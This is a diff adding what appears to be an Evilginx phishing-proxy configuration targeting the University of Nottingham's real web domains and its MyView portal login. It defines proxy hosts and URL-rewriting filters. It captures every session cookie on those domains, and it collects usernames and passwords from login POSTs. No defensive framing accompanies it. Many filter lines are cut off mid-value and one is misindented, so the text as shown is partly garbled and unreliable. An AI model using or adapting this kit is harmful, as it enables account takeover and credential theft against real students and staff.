@@ -1,0 +1,67 @@
+author: ‘@harris'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'nottingham.ac.uk', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'nottingham.ac.uk', session: true, is_landing: false}
+  - {phish_sub: 'myview', orig_sub: 'myview', domain: 'nottingham.ac.uk', session: true, is_landing: false}
+
+
+sub_filters:
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https://myview.nottingham.ac.uk:443', replace: 'https:/$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2Fmyview.nottingham.ac.uk:443', replace: 'h$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'myview.nottingham.ac.uk:443', replace: '{hostname}', mi$
+
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'tex$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', '$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes:$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostna$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html'$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mim$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hos$
+
+
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/j$
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['tex$
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', $
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'tex$
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['$
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}$
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', '$
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes:$
+  - {triggers_on: 'www.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostna$
+
+
+ - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'tex$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: '', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', '$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mimes:$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'www', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostna$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: '{hostname}', replace: '{hostname}', mimes: ['text/html'$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https://{hostname}', replace: 'https://{hostname}', mim$
+  - {triggers_on: 'myview.nottingham.ac.uk', orig_sub: 'myview', domain: 'nottingham.ac.uk', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hos$
+
+
+
+auth_tokens:
+  - domain: '.nottingham.ac.uk'
+    keys: ['.*,regexp']
+  - domain: 'myview.nottingham.ac.uk'
+    keys: ['.*,regexp']
+  - domain: 'www.nottingham.ac.uk'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'myview.nottingham.ac.uk'
+  path: '/dashboard/dashboard-ui/index.html#/landing'
